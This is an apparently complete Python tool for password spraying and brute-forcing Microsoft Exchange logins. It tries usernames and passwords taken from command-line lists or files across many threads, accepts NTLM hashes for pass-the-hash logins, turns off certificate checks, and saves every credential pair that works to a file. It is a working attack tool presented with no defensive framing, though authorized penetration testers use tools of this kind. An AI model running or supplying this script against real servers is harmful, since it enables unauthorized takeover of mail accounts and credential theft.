import argparse
import concurrent.futures
import re
import warnings
from cryptography.utils import CryptographyDeprecationWarning
from exchangelib import Credentials, Configuration, Account, BaseProtocol, NoVerifyHTTPAdapter, DELEGATE
from exchangelib.errors import ErrorNonExistentMailbox, UnauthorizedError, ErrorAccessDenied, TransportError
from loguru import logger
import urllib3

# Configure loguru logger with colored output
logger.remove()  # Remove default handler
logger.add("debug.log", level="DEBUG", format="{time} {level} {message}", rotation="1 MB", compression="zip")
logger.add(lambda msg: print(msg, end=''), level="INFO", format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{message}</level>", colorize=True)

# Suppress warnings
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter

def is_ntlm_hash(password):
    """Check if the password is an NTLM hash."""
    return bool(re.match(r'^[a-fA-F0-9]{32}$', password))

def login(primary_smtp_address, password, server, refresh_root=False):
    """Attempt to log in with the given credentials."""
    if is_ntlm_hash(password):
        credentials = Credentials(primary_smtp_address, f"00000000000000000000000000000000:{password}")
        logger.debug(f"Using NTLM hash for {primary_smtp_address}")
    else:
        credentials = Credentials(primary_smtp_address, password)
        logger.debug(f"Using password for {primary_smtp_address}")
    
    config = Configuration(server=server, credentials=credentials)

    try:
        account = Account(primary_smtp_address=primary_smtp_address, config=config, autodiscover=False, access_type=DELEGATE)
        if refresh_root:
            account.root.refresh()
            logger.success(f"Login Success with refresh: {primary_smtp_address}")
        else:
            logger.success(f"Login Success: {primary_smtp_address}")
        return True
    except UnauthorizedError:
        logger.error(f"Invalid credentials for {primary_smtp_address}")
        return False
    except TransportError as e:
        logger.error(f"Network error for {primary_smtp_address} - Reason: {str(e)}")
        return False
    except Exception as e:
        logger.error(f"Failed to initialize account for {primary_smtp_address} - Reason: {str(e)}")
        return False

def read_file_lines(filename):
    """Read lines from a file, strip whitespace, and ignore empty lines and invalid entries."""
    valid_lines = []
    try:
        with open(filename, 'r') as file:
            for line in file:
                stripped_line = line.strip()
                if stripped_line and '@' in stripped_line:
                    valid_lines.append(stripped_line)
    except IOError as e:
        logger.error(f"File {filename} is not accessible. Reason: {e}")
    return valid_lines

def add_domain_to_usernames(usernames, domain):
    """Add domain to usernames that do not contain '@'."""
    return [f"{user}@{domain}" if '@' not in user else user for user in usernames]

def check_usernames_have_domain(usernames):
    """Check if all usernames have a domain."""
    return all('@' in user for user in usernames)

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="Exchange Login Script")
    parser.add_argument("-u", "--user", help="Single username")
    parser.add_argument("-p", "--password", help="Single password")
    parser.add_argument("-U", "--userlist", help="File with a list of usernames")
    parser.add_argument("-P", "--passlist", help="File with a list of passwords")
    parser.add_argument("-l", "--list", help="File with username:password")
    parser.add_argument("-s", "--server", required=True, help="Exchange server address")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-dmain", "--domain", help="Domain to append to usernames without a domain")
    parser.add_argument("-debug", action='store_true', help="Enable debug output")
    return parser.parse_args()

def main():
    args = parse_arguments()
    server = args.server
    domain = args.domain
    refresh_root = args.debug

    if args.debug:
        logger.debug("Debug mode enabled")
        logger.debug(f"Server: {server}")
        logger.debug(f"Refresh root: {refresh_root}")
        logger.debug(f"Domain: {domain}")

    credentials = []

    if args.user and args.password:
        user = args.user
        if '@' not in user and domain:
            user = f"{user}@{domain}"
        credentials.append((user, args.password))
    elif args.list:
        try:
            with open(args.list, 'r') as f:
                for line in f:
                    if ':' in line:
                        user, password = line.strip().split(':', 1)
                        if '@' not in user and domain:
                            user = f"{user}@{domain}"
                        credentials.append((user, password))
        except IOError as e:
            logger.error(f"File {args.list} is not accessible. Reason: {e}")
    elif args.userlist and args.password:
        users = read_file_lines(args.userlist)
        if not check_usernames_have_domain(users) and not domain:
            logger.error("Usernames without domain detected. Please specify a domain with -dmain.")
            return
        if domain:
            users = add_domain_to_usernames(users, domain)
        credentials.extend((user, args.password) for user in users)
    elif args.userlist and args.passlist:
        users = read_file_lines(args.userlist)
        passwords = read_file_lines(args.passlist)
        if not check_usernames_have_domain(users) and not domain:
            logger.error("Usernames without domain detected. Please specify a domain with -dmain.")
            return
        if domain:
            users = add_domain_to_usernames(users, domain)
        for user in users:
            for password in passwords:
                credentials.append((user, password))
    else:
        logger.error("Please provide credentials with --user and --password, --list, or --userlist and --passlist")
        return

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(login, email, password, server, refresh_root): (email, password) for email, password in credentials}
        for future in concurrent.futures.as_completed(futures):
            email, password = futures[future]
            try:
                result = future.result()
                if result:
                    with open("success_results.txt", "a") as result_output:
                        result_output.write(f"{email}:{password}\n")
            except Exception as exc:
                logger.error(f"{email}:{password} generated an exception: {exc}")

if __name__ == "__main__":
    main()
